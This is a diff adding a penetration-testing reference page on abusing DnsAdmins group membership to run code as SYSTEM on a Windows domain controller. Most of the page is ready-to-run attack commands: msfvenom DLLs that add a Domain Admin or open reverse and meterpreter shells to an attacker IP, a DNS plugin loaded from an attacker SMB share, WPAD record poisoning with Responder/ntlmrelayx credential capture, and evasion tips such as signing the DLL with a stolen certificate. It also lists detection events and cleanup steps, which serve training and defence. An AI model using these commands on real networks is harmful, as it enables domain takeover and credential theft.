@@ -1,0 +1,429 @@
+---
+title: DnsAdmins
+description: Domain Controller compromise via DnsAdmins group membership - the DNS service running on a DC supports a ServerLevelPluginDll registry setting that loads a custom DLL when DNS starts. DnsAdmins members can write this value via dnscmd; the DNS service runs as SYSTEM, so the loaded DLL executes as SYSTEM on the DC. The result is local SYSTEM on the DC, which composes with NTDS.dit extraction for full domain compromise. Three variants covered - msfvenom DLL payload, mimilib.dll, and the WPAD-record alternative for environments where DLL load is restricted.
+mitre: [T1574.002, T1078.002, T1068]
+d3fend: [D3-PM]
+impact: [PrivEsc, SystemCompromise, DomainCompromise, AdminCompromise]
+owasp: []
+sidebar:
+  order: 9
+  label: DnsAdmins
+---
+
+## TL;DR
+
+A member of the `DnsAdmins` group can specify an arbitrary DLL path for the DNS service to load via the `ServerLevelPluginDll` registry value. The DNS service runs as `NT AUTHORITY\SYSTEM`, and on a Domain Controller DNS is typically co-located - so the loaded DLL executes as SYSTEM on the DC. From SYSTEM on a DC, NTDS.dit dump and golden ticket forging are straightforward.
+
+```
+# Confirm membership
+whoami /groups | findstr DnsAdmins
+Get-ADGroupMember -Identity DnsAdmins
+
+# Generate malicious DLL (attacker host)
+msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
+
+# Stage DLL and point DNS at it
+copy adduser.dll C:\Users\netadm\Desktop\adduser.dll
+dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
+
+# Restart the DNS service to load the DLL
+sc stop dns && sc start dns
+# or: net stop dns && net start dns
+
+# Verify
+net group "Domain Admins" /domain
+```
+
+Success indicator: arbitrary code execution as SYSTEM on the Domain Controller - net group membership change, reverse shell as SYSTEM, or persistence implant deployed.
+
+## Why this works
+
+DNS in an Active Directory forest is almost always integrated with the Domain Controllers - every DC typically runs the DNS Server service so that AD-integrated DNS zones replicate via AD replication rather than zone transfers. The DNS service runs as `NT AUTHORITY\SYSTEM`.
+
+Microsoft designed the DNS service to support custom plugin DLLs. When a name resolution query falls outside any locally-hosted zone, the service consults the path stored in `HKLM\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll`. If that value is populated, the DLL is loaded into the DNS service process. Since the service runs as SYSTEM, the DLL executes as SYSTEM.
+
+The privilege escalation: the `DnsAdmins` group has rights to set `ServerLevelPluginDll` via the `dnscmd.exe` RPC interface. There is no path validation - the value can point to any DLL accessible to the DNS service. A `DnsAdmins` member who is not otherwise an administrator can write the value, restart DNS, and gain SYSTEM execution on the DC.
+
+The composition matters: SYSTEM on the DC has access to `NTDS.dit`, the `SAM` and `SYSTEM` registry hives, the krbtgt account's NT hash, every domain user's NT hash, and every Kerberos service account key. SYSTEM on a DC is functionally equivalent to Domain Admin plus all account credentials.
+
+DnsAdmins is therefore treated as a tier-0 group in any sound AD security model, despite its name suggesting a narrow administrative scope.
+
+## Confirming membership
+
+```cmd
+C:\> whoami /groups | findstr -i dnsadmins
+
+INLANEFREIGHT\DnsAdmins                Group            S-1-5-21-...-1106 Mandatory group, Enabled by default
+```
+
+Or query AD directly:
+
+```powershell
+PS> Get-ADGroupMember -Identity DnsAdmins
+
+distinguishedName : CN=netadm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+name              : netadm
+objectClass       : user
+objectGUID        : 1a1ac159-f364-4805-a4bb-7153051a8c14
+SamAccountName    : netadm
+SID               : S-1-5-21-669053619-2741956077-1013132368-1109
+```
+
+If the current user isn't a member but the engagement involves AD object ACL abuse (e.g., GenericWrite over the DnsAdmins group), the path is to add the controlled account first, then proceed.
+
+## Generating the payload DLL
+
+The DLL must export `DllMain` and perform the action of choice on `DLL_PROCESS_ATTACH`. For simple actions, msfvenom builds this in one command.
+
+### msfvenom - add to Domain Admins
+
+```shell
+$ msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
+
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 313 bytes
+Final size of dll file: 5120 bytes
+Saved as: adduser.dll
+```
+
+Architecture note: match the DLL architecture to the DNS service architecture. Modern Windows Server DCs are x64; use `windows/x64/exec`. Older Server 2008 R2 DCs may still be x64 (most are), but verify with `systeminfo` on the target before generating.
+
+### msfvenom - reverse shell
+
+```shell
+$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll -o revshell.dll
+```
+
+Pair with `nc -lvnp 8443` on the attacker. The DNS service will spawn the reverse shell as SYSTEM when it loads the DLL.
+
+### msfvenom - meterpreter
+
+```shell
+$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f dll -o meter.dll
+```
+
+Catch with `msfconsole -r handler.rc` configured for the same payload type. Meterpreter is more capable for post-exploitation but more heavily signatured.
+
+### Pre-built mimilib.dll variant
+
+Benjamin Delpy's [mimilib](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib) (companion to mimikatz) ships a DNS plugin variant that logs DNS queries and can execute commands. Modify `kdns.c` before compiling:
+
+```c
+DWORD WINAPI kdns_DnsPluginQuery(PSTR pszQueryName, WORD wQueryType, PSTR pszRecordOwnerName, PDB_RECORD *ppDnsRecordListHead)
+{
+    FILE * kdns_logfile;
+    if(kdns_logfile = _wfopen(L"kiwidns.log", L"a"))
+    {
+        klog(kdns_logfile, L"%S (%hu)\n", pszQueryName, wQueryType);
+        fclose(kdns_logfile);
+        system("ENTER COMMAND HERE");        // ← attacker command runs as SYSTEM per query
+    }
+    return ERROR_SUCCESS;
+}
+```
+
+Compile mimilib with the modified source, drop the resulting `mimilib.dll` to the target, and use it as the `ServerLevelPluginDll` value. The advantage over a single-shot msfvenom DLL: every DNS query the service processes triggers the `system()` call, giving persistence-style execution rather than a one-time payload. The disadvantage: each query spawns a process, which is noisy.
+
+## Staging the DLL
+
+The path used in `ServerLevelPluginDll` must be readable by the DNS service (which runs as SYSTEM, so almost any path works). Common staging locations:
+
+- `C:\Users\<dnsadmin>\Desktop\` - works if `dnsadmin` is a real user with a profile and the desktop is writable
+- `C:\Windows\Temp\` - writable by `BUILTIN\Users`, accessible by SYSTEM
+- `C:\ProgramData\` - similar properties
+
+A network share path (`\\attacker\share\adduser.dll`) also works because the DC machine account can read attacker-controlled SMB shares - but this generates extra noise and may fail in environments with SMB egress filtering.
+
+For the canonical Inlanefreight-style scenario where `netadm` is a domain user member of DnsAdmins with RDP to a member server:
+
+```cmd
+C:\> copy adduser.dll C:\Users\netadm\Desktop\adduser.dll
+```
+
+For non-RDP contexts, drop via SMB:
+
+```shell
+$ smbclient -U netadm //DC01/C$
+smb: \> cd Users\netadm\Desktop
+smb: \Users\netadm\Desktop\> put adduser.dll
+```
+
+Or via the same SMB mechanism that delivered other tools to the host.
+
+## Setting the registry value
+
+The `dnscmd.exe` utility is the supported interface for `DnsAdmins` to configure the DNS service. Direct registry writes by `DnsAdmins` members fail - the group has no direct rights on `HKLM\SYSTEM\CurrentControlSet\services\DNS\Parameters`. The DNS service exposes RPC methods that `dnscmd.exe` invokes, which then perform the registry write as SYSTEM on behalf of the caller.
+
+### From an unprivileged shell
+
+If the user isn't in DnsAdmins, the command fails:
+
+```cmd
+C:\> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
+
+DNS Server failed to reset registry property.
+    Status = 5 (0x00000005)
+Command failed: ERROR_ACCESS_DENIED
+```
+
+`ERROR_ACCESS_DENIED` is the indicator that the current user isn't a DnsAdmins member.
+
+### As a DnsAdmins member
+
+```cmd
+C:\> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
+
+Registry property serverlevelplugindll successfully reset.
+Command completed successfully.
+```
+
+The full absolute path is required - relative paths and PATH-style lookups fail. UNC paths to remote shares also work if SMB egress is open from the DC.
+
+### Targeting a remote DC
+
+If you have DnsAdmins on the domain but not interactive access to the DC, `dnscmd` accepts a remote DC as the first argument:
+
+```cmd
+C:\> dnscmd.exe DC01.inlanefreight.local /config /serverlevelplugindll \\10.10.14.3\share\adduser.dll
+```
+
+This is the variant most useful for engagements where DnsAdmins membership exists on a workstation that doesn't itself host DNS - write to the DC remotely.
+
+## Restarting the DNS service
+
+The DLL is only loaded when the DNS service starts. Setting `ServerLevelPluginDll` doesn't trigger an immediate load - the service must restart.
+
+### Verifying service control rights
+
+DnsAdmins membership doesn't automatically include service-restart rights on the DNS service. Check before assuming:
+
+```cmd
+C:\> wmic useraccount where name="netadm" get sid
+
+SID
+S-1-5-21-669053619-2741956077-1013132368-1109
+
+C:\> sc.exe sdshow DNS
+
+D:(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)(A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)
+```
+
+Look for the user's SID in the SDDL. The ACE `(A;;RPWP;;;<USER_SID>)` grants `SERVICE_START` (`RP`) and `SERVICE_STOP` (`WP`) to the user. In the example above, `netadm` has `RPWP` on the DNS service - enough to restart.
+
+If the SID isn't listed with start/stop rights, the operator can't trigger immediate execution and must wait for a natural service restart (server reboot, scheduled maintenance, or a DNS service crash). This is unreliable for time-boxed engagements.
+
+For SDDL syntax reference: `A` = Allow ACE; `RP` = `SERVICE_START`; `WP` = `SERVICE_STOP`; `LC` = `SERVICE_QUERY_STATUS`; `DC` = `SERVICE_CHANGE_CONFIG`; `SW` = `SERVICE_ENUMERATE_DEPENDENTS`; `LO` = `SERVICE_INTERROGATE`; `CR` = `SERVICE_USER_DEFINED_CONTROL`; `RC` = `READ_CONTROL`; `WD` = `WRITE_DAC`; `WO` = `WRITE_OWNER`.
+
+### Stopping and starting
+
+```cmd
+C:\> sc stop dns
+
+SERVICE_NAME: dns
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 3  STOP_PENDING
+                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
+
+C:\> sc start dns
+
+SERVICE_NAME: dns
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 2  START_PENDING
+```
+
+The start may show as `START_PENDING` followed by an error if the DLL is malformed or if the DNS service crashes after loading it (common with one-shot msfvenom payloads - the payload runs, but the service fails to provide DNS resolution).
+
+### Alternate restart commands
+
+PowerShell sometimes refuses `sc start` from a non-elevated console. The CMD equivalents are reliable:
+
+```cmd
+C:\> net stop dns
+C:\> net start dns
+```
+
+Or:
+
+```powershell
+PS> Restart-Service -Name DNS -Force
+```
+
+If the DNS service crashes during the malicious DLL load, the `net start` may fail with a generic error - but the payload has already run by then. Check the actual effect (e.g., `net group "Domain Admins" /domain` for an add-user payload) rather than relying on the service-restart command's return code.
+
+## Verifying success
+
+For the add-to-Domain-Admins variant:
+
+```cmd
+C:\> net group "Domain Admins" /domain
+
+Group name     Domain Admins
+Comment        Designated administrators of the domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator            netadm
+The command completed successfully.
+```
+
+`netadm` appearing in the Domain Admins list confirms the DLL executed as SYSTEM on the DC. The new membership doesn't take effect for the current session - log out and back in as `netadm`, or use the credentials for a fresh authentication, to receive a token with Domain Admin group SID.
+
+For the reverse-shell variant, the listener catches a SYSTEM-context shell from the DC. For the meterpreter variant, the handler shows `Server username: NT AUTHORITY\SYSTEM` on the DC.
+
+## Cleaning up
+
+This attack is destructive - both because the DNS service may be left in a non-functional state, and because the `ServerLevelPluginDll` registry value persists across reboots, causing the malicious DLL to load every time DNS starts.
+
+### Removing the registry value
+
+```cmd
+C:\> reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
+
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters
+    GlobalQueryBlockList    REG_MULTI_SZ    wpad\0isatap
+    EnableGlobalQueryBlockList    REG_DWORD    0x1
+    Forwarders    REG_MULTI_SZ    1.1.1.1\08.8.8.8
+    ServerLevelPluginDll    REG_SZ    C:\Users\netadm\Desktop\adduser.dll
+
+C:\> reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
+
+Delete the registry value ServerLevelPluginDll (Yes/No)? Y
+The operation completed successfully.
+```
+
+The reg-delete works from a SYSTEM context (which the operator now has via the privesc) or from an existing admin account. From the original DnsAdmins context it fails - DnsAdmins doesn't have direct registry write.
+
+After deletion, restart DNS once more to clear any cached state:
+
+```cmd
+C:\> sc start dns
+```
+
+Verify the service is healthy:
+
+```cmd
+C:\> sc query dns
+
+SERVICE_NAME: dns
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 4  RUNNING
+```
+
+And confirm DNS resolution works via `nslookup` against the DC.
+
+### Removing the malicious DLL
+
+```cmd
+C:\> del C:\Users\netadm\Desktop\adduser.dll
+```
+
+For engagements where the new Domain Admin account was created, remove it:
+
+```cmd
+C:\> net group "Domain Admins" netadm /delete /domain
+```
+
+## The WPAD record alternative
+
+When DLL loading isn't feasible - too noisy, blocked by AMSI/EDR, or DNS service is unstable after the load - DnsAdmins can be abused via a DNS record manipulation instead. The technique: disable the DNS global-query-block list, then create a `wpad` record pointing at the attacker.
+
+### Background
+
+Windows clients by default look up `wpad.<domain>` to find a Web Proxy Auto-Discovery Protocol configuration. If they get an answer, they proxy traffic through the address it points to. This is exploitable: an attacker hosting a proxy on that address captures authenticated HTTP traffic (including NTLM challenge-response that can be relayed or cracked offline).
+
+Microsoft mitigated this in Server 2008+ by adding `wpad` and `isatap` to a global-query-block list - even if a `wpad` record exists in DNS, the server refuses to answer the query. The block list lives in `HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters\GlobalQueryBlockList`.
+
+DnsAdmins members can disable the block list, which re-enables WPAD-based attacks across the domain.
+
+### Disabling the block list
+
+```powershell
+PS> Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
+```
+
+Or via the legacy interface:
+
+```cmd
+C:\> dnscmd.exe DC01.inlanefreight.local /config /enableglobalqueryblocklist 0
+```
+
+### Creating the WPAD record
+
+```powershell
+PS> Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
+```
+
+The IP points at the attacker host. Now domain clients resolving `wpad.inlanefreight.local` (which they do automatically on network join) will direct their web traffic to the attacker.
+
+### Capturing credentials
+
+On the attacker:
+
+```shell
+$ sudo responder -wrf -v -I tun0
+```
+
+or:
+
+```shell
+$ python3 ntlmrelayx.py -tf targets.txt -smb2support
+```
+
+The captured NTLMv2 hashes can be cracked offline with hashcat (mode 5600), or relayed live to other services with `ntlmrelayx.py` to gain access without ever cracking.
+
+This approach doesn't directly give SYSTEM on the DC, but it provides a steady stream of credentials and lateral movement opportunities across the domain - sometimes more valuable than a single SYSTEM shell on one machine.
+
+## Operational considerations
+
+### Detection
+
+The technique generates strong telemetry:
+
+- **Event 4657** (registry value modified) on `ServerLevelPluginDll` - almost never legitimately changed
+- **Sysmon event 13** (registry value set) on the same value
+- **DNS service stop/start events** in the System log - pairs with the registry change
+- **Process creation** from the DNS service (`dns.exe` parent) - `dns.exe` doesn't normally spawn child processes; `dns.exe → cmd.exe` is highly anomalous
+- **Sysmon event 7** (image loaded) showing a non-Microsoft-signed DLL loaded by `dns.exe`
+- **Microsoft Defender for Identity** alerts specifically on this attack pattern
+
+For evasive ops:
+
+- Use a DLL with no obvious payload - just open a port or write a marker file, then chain the SYSTEM access into a subsequent technique
+- Sign the DLL with a stolen or legitimate code-signing certificate if one is available
+- Time the attack during a window where DNS service restarts are expected (e.g., during scheduled maintenance)
+
+### Why this isn't fixed
+
+Microsoft considers DnsAdmins-to-SYSTEM-on-DC a configuration issue rather than a vulnerability. The DnsAdmins group exists to administer DNS, and DNS administration includes the ability to load plugin DLLs. The recommendation from Microsoft is to treat DnsAdmins as a tier-0 group - equivalent to Domain Admin from a risk perspective - and protect membership accordingly.
+
+In practice, many organizations populate DnsAdmins with help-desk or junior infrastructure staff who don't have Domain Admin rights. This is a misconfiguration in the operational sense even though no specific Windows bug exists.
+
+## Quick reference
+
+| Task | Pattern |
+| --- | --- |
+| Confirm DnsAdmins membership | `whoami /groups \| findstr DnsAdmins` |
+| List DnsAdmins members (AD) | `Get-ADGroupMember -Identity DnsAdmins` |
+| Generate add-user DLL | `msfvenom -p windows/x64/exec cmd='net group "domain admins" USER /add /domain' -f dll -o add.dll` |
+| Generate reverse-shell DLL | `msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f dll -o rev.dll` |
+| Generate meterpreter DLL | `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=PORT -f dll -o meter.dll` |
+| Stage DLL locally | `copy payload.dll C:\Users\netadm\Desktop\` |
+| Stage DLL via SMB | `smbclient //DC/C$ -U dnsadmin → put payload.dll` |
+| Set ServerLevelPluginDll (local DC) | `dnscmd.exe /config /serverlevelplugindll C:\path\payload.dll` |
+| Set ServerLevelPluginDll (remote DC) | `dnscmd.exe DC01.domain /config /serverlevelplugindll \\attacker\share\payload.dll` |
+| Check restart rights on DNS | `sc sdshow DNS` - look for user SID with `RPWP` |
+| Restart DNS service (sc) | `sc stop dns && sc start dns` |
+| Restart DNS service (net) | `net stop dns && net start dns` |
+| Restart DNS service (PS) | `Restart-Service -Name DNS -Force` |
+| Verify add-user success | `net group "Domain Admins" /domain` |
+| Cleanup - remove registry value | `reg delete \\DC\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll` |
+| Cleanup - restart DNS clean | `sc start dns` |
+| Alternative - disable WPAD block | `Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName DC` |
+| Alternative - add WPAD record | `Add-DnsServerResourceRecordA -Name wpad -ZoneName DOMAIN -IPv4Address ATTACKER -ComputerName DC` |
+| Capture WPAD-relayed creds | `sudo responder -wrf -I tun0` or `ntlmrelayx.py -tf targets.txt -smb2support` |
+| Detection signal | Event 4657 on ServerLevelPluginDll, Sysmon 7 on dns.exe loading non-MS DLL |
+
+For the post-exploitation path from SYSTEM on a DC, see [Backup Operators](/codex/windows/privesc/backup-operators/) (NTDS.dit dump). For other tier-0-equivalent groups, see [Other privileged groups](/codex/windows/privesc/other-privileged-groups/) (Hyper-V Administrators, Print Operators, Server Operators).
